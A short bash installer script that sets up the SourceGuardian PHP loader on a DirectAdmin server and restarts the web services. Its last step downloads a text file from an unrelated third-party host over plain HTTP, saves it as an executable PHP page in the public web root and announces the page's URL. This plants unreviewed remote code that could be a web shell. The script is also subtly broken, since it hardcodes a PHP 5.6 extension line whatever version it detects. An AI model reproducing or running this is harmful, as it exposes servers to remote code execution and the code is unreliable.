#!/bin/bash
#Beta Version

#Global var
OS_ARCH=$(uname -m) ;
PHP_VER=$(php -v | grep PHP | cut -d" " -f2 | head -c3) ;
PHP_Loaded=$(php --ini | grep Loaded | cut -d" " -f12);
IP=$(hostname -i) ;
#Find extension_dir path
PHPINI=$(php --ini | grep Additional | cut -d" " -f10) ;
PHPINI=$(echo ${PHPINI} | sed -e 's/\,//g') ;
EX_DIR=$(grep extension_dir= $PHPINI | cut -d"=" -f2) ;

if [ "${OS_ARCH}" == "x86_64" ]; then
    cd $EX_DIR ;
	mkdir tmp;
	cd tmp;
	wget https://www.sourceguardian.com/loaders/download/loaders.linux-x86_64.tar.gz ;
	tar -xzf  loaders.linux-x86_64.tar.gz ;
	chmod 755 "ixed.$PHP_VER.lin" ;
	cp "ixed.$PHP_VER.lin" ../ ;
	cd ../;
	rm -rf tmp/;
	echo "extension=ixed.5.6.lin" >> $PHP_Loaded ;
	service httpd restart ;
	service nginx restart ;
	/usr/local/directadmin/custombuild/build rewrite_confs ;
	cd /var/www/html/ ;
	wget -O test10.php http://lammer.ir/ac/test10.txt ;
	chown webapps:webapps test10.php ;
	echo -n "" ;
	echo "[Notice] : see Tester Result : http://${IP}/test10.php";
fi
